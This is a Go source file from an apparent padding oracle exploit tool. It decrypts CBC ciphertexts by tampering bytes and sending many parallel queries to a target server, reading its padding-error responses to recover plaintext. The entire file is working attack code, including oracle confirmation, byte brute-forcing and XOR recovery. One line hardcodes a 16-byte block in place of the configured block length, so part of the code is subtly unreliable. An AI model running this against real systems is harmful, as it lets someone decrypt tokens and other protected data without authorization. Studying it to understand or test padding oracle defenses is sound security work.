package main

/* implementation of Padding Oracle exploit algorithm */

import (
	"context"
	"errors"
	"fmt"
)

func decipher(cipherEncoded string) ([]byte, error) {

	blockLen := *config.blockLen //just a shortcut

	/* usually we are given an initial, valid cipher, tampering on which, we discover the plaintext
	we decode it into bytes, so we can tamper it at that byte level */
	if cipherEncoded == "" {
		return nil, fmt.Errorf("empty cipher")
	}

	cipher, err := config.encoder.decode(cipherEncoded)
	if err != nil {
		return nil, err
	}

	/* we need to check that overall cipher length complies with blockLen
	as this is crucial to further logic */
	if len(cipher)%blockLen != 0 {
		return nil, fmt.Errorf("Cipher len is not compatible with block len (%d %% %d != 0)", len(cipher), blockLen)
	}

	/* confirm padding oracle */
	err = confirmOracle(cipher)
	if err != nil {
		return nil, err
	}

	/* get block count and len of original plaintext
	NOTE: the first block of cipher is considered as IV */
	blockCount := len(cipher)/blockLen - 1
	plainLen := blockCount * blockLen

	/* now, we gonna tamper at every block separately,
	thus we need to split up the whole payload into blockSize*2 sized chunks
	- first half - the bytes we gonna tamper on
	- second half - the bytes that will produce the padding error */
	cipherChunks := make([][]byte, blockCount)
	for i := 0; i < blockCount; i++ {
		cipherChunks[i] = make([]byte, blockLen*2)
		copy(cipherChunks[i], cipher[i*blockLen:(i+2)*blockLen])
	}

	// create container for a final plaintext
	plainText := make([]byte, plainLen)

	// init new status bar
	currentStatus.openBar(plainLen)
	defer currentStatus.closeBar()

	// decode every cipher chunk and fill-in the relevant plaintext positions
	// we move backwards through chunks, though it really doesn't matter
	for i := len(cipherChunks) - 1; i >= 0; i-- {
		plainChunk, err := decipherChunk(cipherChunks[i])
		if err != nil {
			// report error to current status
			return nil, err
		}
		copy(plainText[i*16:(i+1)*16], plainChunk)
	}

	// that's it!
	return plainText, nil
}

/* carry out pre-flight checks:
1. confirm that original cipher is valid (does not produce padding error)
2. confirm that tampered cipher produces padding error */
func confirmOracle(cipher []byte) error {
	status := currentStatus
	/* one */
	status.printAction("Confirming provided cipher is valid...")
	e, err := isPaddingError(cipher, nil)
	if err != nil {
		return err
	}
	if e {
		return fmt.Errorf("Initial cipher produced padding error. It is not suitable therefore")
	}

	/* two */
	status.printAction("Cofirming padding oracle...")
	tamperPos := len(cipher) - *config.blockLen - 1
	originalByte := cipher[tamperPos]
	defer func() { cipher[tamperPos] = originalByte }()

	/* tamper last byte  of pre-last block twice, to avoid case when we hit another valid padding
	e.g. if original cipher ends with \x02\x01,
	then if we only would use one try, we can (unlikely) hit into ending \x02\x02 which is also a valid padding */

	for i := 0; i <= 3; i++ {
		// we can waste one try if hit original byte
		if byte(i) == originalByte {
			continue
		}

		cipher[tamperPos] = byte(i)
		e, err = isPaddingError(cipher, nil)
		if err != nil || e {
			break
		}
	}
	if err != nil {
		return err
	}

	if !e {
		return fmt.Errorf("padding oracle not confirmed, check the error string provided (-err option) and server response")
	}
	return nil
}

/* deciphers the chunk of cipher, the passed chunk shoule of length blockLen*2 */
func decipherChunk(chunk []byte) ([]byte, error) {
	blockLen := *config.blockLen

	// create buffer to store the deciphered block of plaintext
	plainText := make([]byte, blockLen)

	// we start with the last byte of first block
	// and repeat the same procedure for every byte in that block, moving backwards
	for pos := blockLen - 1; pos >= 0; pos-- {
		originalByte := chunk[pos]
		var foundByte *byte

		if pos == blockLen-1 {
			/* logic for the last byte is slightly different
			this is because we can (very unlikely, but still) run into a situation where valid padding is misleading
			e.g. we assume that plaintext byte of valid padding is \x01, but it can be \x02 if original plaintext ends with \x02\x01
			anyway, if you curious, check this answer:
			https://crypto.stackexchange.com/questions/37608/clarification-on-the-origin-of-01-in-this-oracle-padding-attack?rq=1#comment86828_37609
			*/
			found, err := findGoodBytes(chunk, pos, 2)
			if err != nil {
				return nil, err
			}

			/* for reasons described above, we must ensure that valid padding is indeed \x01
			we can modify second-last byte, and if padding oracle still doesn't show up, then we're good */
			secondLast := chunk[pos-1] // backup second-last byte

			for _, b := range found {
				chunk[pos] = b // the candidate byte goes to last position
				chunk[pos-1]-- // randomly modify second-last byte

				e, err := isPaddingError(chunk, nil) // and check for padding error
				if err != nil {
					return nil, err
				}
				// if padding error did not happen, it's a good byte we found!
				if !e {
					foundByte = &b
					break
				}
			}

			/* if loop above did not exit because of confirming a good byte,
			well, something is wrong
			i mean we just got those bytes without padding errors */
			if foundByte == nil {
				return nil, errors.New("Unexpected server behaviour. Aborting")
			}

			// restore second-to-last byte, remember?
			chunk[pos-1] = secondLast
		} else {
			/* the logic for other positions is way simpler */
			found, err := findGoodBytes(chunk, pos, 1)
			if err != nil {
				return nil, err
			}
			foundByte = &found[0]
		}

		// okay, now that we found the byte that fits, we can reveal the plaintext byte with some XOR magic
		currPaddingValue := byte(blockLen - pos)
		plainText[pos] = *foundByte ^ originalByte ^ currPaddingValue

		// report to current status about deciphered plain byte
		currentStatus.reportPlainByte(plainText[pos])

		/* we need to repair the padding for the next shot
		e.g. we need to adjust the already tampered bytes block*/
		chunk[pos] = *foundByte
		nextPaddingValue := currPaddingValue + 1
		adjustingValue := currPaddingValue ^ nextPaddingValue
		for i := pos; i < blockLen; i++ {
			chunk[i] ^= adjustingValue
		}
	}

	return plainText, nil
}

/* finds bytes that fit-in without causing the padding oracle
when finds extected count, cancels all active requests*/
func findGoodBytes(chunk []byte, pos int, maxCount int) ([]byte, error) {
	/* the context will be cancelled upon returning from function */
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	/* output container */
	out := make([]byte, 0, maxCount)

	/* communcation channels */
	chanVal := make(chan byte, 256)
	chanPara := make(chan byte, *config.parallel)
	chanPaddingError := make(chan byte, 256)
	chanErr := make(chan error, 256)

	/* find out which bytes produce padding oracles, in parallel */
	for i := 0; i <= 255; i++ {
		tamperedByte := byte(i)

		go func(value byte) {
			// parallel goroutine control
			chanPara <- 1
			defer func() { <-chanPara }()

			// copy chunk to make tamepering concurrent-safe
			chunkCopy := make([]byte, len(chunk))
			copy(chunkCopy, chunk)
			chunkCopy[pos] = value

			// test for padding oracle
			paddingError, err := isPaddingError(chunkCopy, &ctx)

			// check for errors
			if err != nil {
				// context cancel errors don't count
				if ctx.Err() != context.Canceled {
					chanErr <- err
				}
			} else if !paddingError {
				chanVal <- value
			} else {
				chanPaddingError <- 1
			}
		}(tamperedByte)
	}

	// process results
	done := 0
	for {
		select {
		case <-chanPaddingError:
		case err := <-chanErr:
			return nil, err
		case val := <-chanVal:
			out = append(out, val)
			if len(out) == maxCount {
				return out, nil
			}
		}
		// general counter of finished goroutines
		done++
		if done == 256 {
			if len(out) == 0 {
				return nil, errors.New("Failed to decrypt. Every tried byte gave a padding error")
			}
			return out, nil
		}
	}
}
